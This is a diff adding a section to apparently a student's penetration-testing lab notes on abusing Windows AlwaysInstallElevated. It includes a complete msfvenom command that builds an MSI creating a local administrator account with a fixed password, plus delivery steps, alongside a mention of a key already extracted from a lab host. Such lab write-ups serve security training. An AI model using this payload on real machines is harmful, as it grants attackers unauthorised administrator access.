@@ -52,6 +52,14 @@ From the Nessus scan i know that iloveshells.vm.vuln.land has a critical vulnera
 
 Success: attack succeded. Private key starts with "MIICW"  (see screenshot)
 
+### Create an msi which creates an local admin user (via )
+If AlwaysInstallElevated is true (1), installer runs as elevated and it can be used to create local admins via msfvenom (`msfvenom -h`) a payload generator that is bundled with Metasploit. 
+
+`msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add hacker Hacker@Work && net localgroup administrators hacker /add"' -f msi > useradd.msi`
+    - will create a msi file "useradd.msi" that runs the following code: "net user /add hacker Hacker@Work && net localgroup administrators hacker /add"$
+        - new user "hacker" with password "Hacker@Work" which is local admin 
+    - file will have to be copied to a windows machine (via any means: fileshare, web attachment, gosh, etc.)
+    - When we download an run msi on windows, we might have to click away warnings.
 
 ### Further examples
 - Postgres -> see solutions "Gaining Access/Metasploitable MV"
